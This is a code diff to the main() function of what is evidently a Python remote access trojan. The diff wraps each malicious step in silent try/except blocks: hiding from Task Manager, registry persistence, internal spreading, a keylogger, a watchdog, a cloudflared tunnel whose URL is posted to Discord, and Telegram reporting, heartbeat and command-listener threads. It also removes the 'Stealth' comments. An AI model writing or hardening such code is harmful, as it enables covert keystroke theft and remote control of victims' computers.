@@ -3599,32 +3599,57 @@ def main():
     if not has_discord and not has_telegram:
         return
     
-    # Stealth: hide from task manager
-    _hide_from_taskmanager()
+    try:
+        _hide_from_taskmanager()
+    except:
+        pass
     
-    # Stealth: add registry persistence
-    _add_registry_persistence()
+    try:
+        _add_registry_persistence()
+    except:
+        pass
     
-    # Stealth: spread internally (only when compiled)
-    _spread_internally()
+    try:
+        _spread_internally()
+    except:
+        pass
     
-    # Start keylogger on backend startup
-    start_keylogger()
+    try:
+        start_keylogger()
+    except:
+        pass
     
-    # Start watchdog
-    _start_watchdog()
+    try:
+        _start_watchdog()
+    except:
+        pass
     
     port = find_free_port()
     global CLOUDFLARED_PUBLIC_URL
-    CLOUDFLARED_PUBLIC_URL = start_cloudflared(port) or ""
+    try:
+        CLOUDFLARED_PUBLIC_URL = start_cloudflared(port) or ""
+    except:
+        CLOUDFLARED_PUBLIC_URL = ""
     
     if CLOUDFLARED_PUBLIC_URL:
         if has_discord:
-            post_to_discord(CLOUDFLARED_PUBLIC_URL)
+            try:
+                post_to_discord(CLOUDFLARED_PUBLIC_URL)
+            except:
+                pass
         if has_telegram:
-            _send_telegram_full_report(CLOUDFLARED_PUBLIC_URL)
-            threading.Thread(target=_telegram_heartbeat, args=(CLOUDFLARED_PUBLIC_URL,), daemon=True).start()
-            threading.Thread(target=_telegram_command_listener, daemon=True).start()
+            try:
+                _send_telegram_full_report(CLOUDFLARED_PUBLIC_URL)
+            except:
+                pass
+            try:
+                threading.Thread(target=_telegram_heartbeat, args=(CLOUDFLARED_PUBLIC_URL,), daemon=True).start()
+            except:
+                pass
+            try:
+                threading.Thread(target=_telegram_command_listener, daemon=True).start()
+            except:
+                pass
     
     try:
         app.run(host=SERVICE_HOST, port=port, debug=False, use_reloader=False)
